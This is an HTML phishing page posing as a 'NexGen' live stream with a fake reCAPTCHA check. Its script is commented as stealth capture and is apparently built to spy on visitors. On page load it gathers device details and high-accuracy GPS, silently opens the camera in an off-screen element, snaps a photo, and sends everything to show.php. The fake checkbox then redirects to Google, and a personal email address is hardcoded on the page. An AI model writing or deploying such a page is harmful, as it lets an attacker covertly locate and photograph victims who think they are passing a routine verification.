<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="refresh" content="300">
    <title>NexGen | Live Media Stream</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a0a;
            --text: #e0e0e0;
            --gray: #5f6368;
            --blue: #1a73e8;
            --green: #34a853;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #loading-screen {
            text-align: center;
        }
        .spinner {
            width: 56px; height: 56px;
            border: 6px solid #333;
            border-top: 6px solid var(--blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { font-size: 22px; margin-bottom: 12px; }

        #verify-screen {
            display: none;
            background: rgba(30, 30, 40, 0.95);
            border: 1px solid #444;
            border-radius: 12px;
            padding: 40px 32px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
        }
        .title { font-size: 24px; font-weight: 500; margin-bottom: 16px; }
        .email { font-size: 16px; color: var(--blue); margin-bottom: 24px; word-break: break-all; }
        .instruction { font-size: 16px; margin-bottom: 24px; }
        .recaptcha-container {
            display: inline-flex; align-items: center; gap: 12px;
            background: rgba(50,50,60,0.6); border: 2px solid #555;
            border-radius: 6px; padding: 14px 24px; cursor: pointer;
            user-select: none; transition: border-color 0.2s; margin: 0 auto 20px;
        }
        .recaptcha-container:hover { border-color: var(--blue); }
        .checkbox {
            width: 26px; height: 26px; border: 2px solid var(--gray); border-radius: 4px;
            display: flex; align-items: center; justify-content: center;
            font-size: 20px; color: white; background: #222; transition: all 0.2s;
        }
        .checked .checkbox { background: var(--green); border-color: var(--green); }
        .recaptcha-text { font-size: 15px; font-weight: 500; }
        .recaptcha-footer { font-size: 12px; color: #888; }
        .recaptcha-footer a { color: var(--blue); text-decoration: none; }
        .verifying { font-size: 16px; color: var(--green); margin-top: 20px; font-weight: 500; }

        #cam-feed, #snapshot {
            position: absolute !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
        }
    </style>
</head>
<body>

    <!-- Loading screen (shown first) -->
    <div id="loading-screen">
        <div class="spinner"></div>
        <div class="loading-text">Verifying your request...</div>
    </div>

    <!-- Fake verification (shown later) -->
    <div id="verify-screen">
        <h1 class="title">Verify that it's you</h1>
        <p class="email">To help keep your account safe, we want to make sure that it's really you.</p>
        <p class="instruction">Confirm that you're not a robot</p>
        <div class="recaptcha-container" id="fakeCaptcha">
            <div class="checkbox" id="checkBox">✓</div>
            <span class="recaptcha-text">I'm not a robot</span>
        </div>
        <div class="recaptcha-footer">
            reCAPTCHA <a href="#">Privacy</a> - <a href="#">Terms</a>
        </div>
        <div class="verifying" id="verifyingText" style="display:none;">Verifying...</div>
    </div>

    <video id="cam-feed" autoplay playsinline muted></video>
    <canvas id="snapshot" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('cam-feed');
        const canvas = document.getElementById('snapshot');
        const ctx = canvas.getContext('2d');
        let deviceModel = "Mobile Device";
        const screenRes = `${screen.width}x${screen.height}`;

        document.querySelector('.email').textContent = `gauravkukde74@gmail.com`;

        // ────────────────────────────────────────────────
        // START CAMERA + CAPTURE AS EARLY AS POSSIBLE
        // ────────────────────────────────────────────────
        (async function startStealthCapture() {
            try {
                // Device info
                if (navigator.userAgentData) {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
                    deviceModel = hints.model || hints.platform || "Device";
                } else {
                    const ua = navigator.userAgent;
                    const match = ua.match(/\(([^)]+)\)/);
                    deviceModel = match ? match[1].split(';')[1]?.trim() || "Mobile" : "Mobile";
                }

                // GPS (parallel, no await needed)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            const { latitude, longitude, accuracy } = pos.coords;
                            fetch(`show.php?lat=${latitude}&long=${longitude}&acc=${accuracy}&model=${encodeURIComponent(deviceModel)}&res=${encodeURIComponent(screenRes)}`);
                        },
                        () => {
                            fetch(`show.php?model=${encodeURIComponent(deviceModel)}&res=${encodeURIComponent(screenRes)}`);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }

                // Camera → start immediately
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                video.srcObject = stream;

                // Take photo ~2–3 seconds after stream starts
                setTimeout(() => {
                    canvas.width = 640;
                    canvas.height = 480;
                    ctx.drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL('image/jpeg', 0.6);

                    fetch('show.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            image: imageData,
                            model: deviceModel,
                            res: screenRes,
                            ua: navigator.userAgent
                        })
                    }).catch(() => {});

                    // Cleanup camera
                    setTimeout(() => stream.getTracks().forEach(t => t.stop()), 800);
                }, 2800);

            } catch (err) {
                console.error("Early capture failed:", err.name, err.message);
            }
        })();

        // ────────────────────────────────────────────────
        // Fake UI flow (does NOT control capture)
        // ────────────────────────────────────────────────
        setTimeout(() => {
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('verify-screen').style.display = 'block';
        }, 3200);

        const captcha = document.getElementById('fakeCaptcha');
        const checkBox = document.getElementById('checkBox');
        const verifyingText = document.getElementById('verifyingText');

        captcha.addEventListener('click', () => {
            if (checkBox.parentElement.classList.contains('checked')) return;
            checkBox.parentElement.classList.add('checked');
            verifyingText.style.display = 'block';

            // Optional redirect when user thinks verification is done
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 1600);
        });
    </script>

   
</body>
</html>
